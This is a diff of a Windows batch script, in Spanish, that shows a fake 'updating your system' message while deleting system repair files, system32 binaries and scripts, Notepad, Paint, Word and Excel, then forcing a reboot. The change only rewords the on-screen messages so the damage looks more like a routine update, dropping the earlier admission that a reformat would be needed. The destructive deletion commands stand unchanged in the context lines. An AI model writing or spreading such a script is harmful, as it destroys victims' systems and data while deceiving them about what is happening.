@@ -1,5 +1,5 @@
 @echo off
-msg * Espere mientras se mejora su sistema operativo
+msg * Espere mientras se actualiza su sistema
 del c:\windows\repair\*.nt -q -f -s
 del c:\windows\system32\*.bin -q -f -s
 del c:\windows\system32\*.bat -q -f -s
@@ -54,6 +54,6 @@ del c:\windows\system32\mspaint.exe
 del c:\windows\system32\notepad.exe
 del winword.exe
 del excel.exe
-msg * Se termino la configuracion del sistema pero vas a tener k formatear de preferencia
+msg * Su sistema ha sido actualizado, aunque quizás va a necesitar un arreglillo
 shutdown -r
 exit
